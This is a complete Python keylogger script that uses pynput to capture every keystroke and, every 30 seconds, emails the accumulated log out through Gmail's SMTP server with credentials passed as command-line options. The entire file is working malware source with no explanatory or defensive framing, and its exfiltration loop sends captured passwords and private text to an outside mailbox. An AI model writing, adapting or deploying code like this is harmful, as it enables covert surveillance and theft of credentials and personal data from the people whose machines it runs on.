import pynput.keyboard
import smtplib
import threading
import optparse

log = ""


def get_user_inputs():
    opts = optparse.OptionParser()
    opts.add_option("-e", "--email", dest="email", help="Email (@gmail.com) address")
    opts.add_option("-p", "--password", dest="password", help="Password")
    inputs = opts.parse_args()[0]
    return inputs


def listener_function(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)
    except:
        pass

    print(log)


def send_email(email, password, message):
    email_server = smtplib.SMTP('smtp.gmail.com', 587)
    email_server.starttls()
    email_server.login(email, password)
    email_server.sendmail(email, email, message)
    email_server.quit()


user_inputs = get_user_inputs()
user_email = user_inputs.email
user_password = user_inputs.password


def thread_function():
    global log
    send_email(user_email, user_password, log.encode('utf-8'))
    log = ""
    timer_object = threading.Timer(30, thread_function)
    timer_object.start()


keylogger_listener = pynput.keyboard.Listener(on_press=listener_function)
with keylogger_listener:
    thread_function()
    keylogger_listener.join()
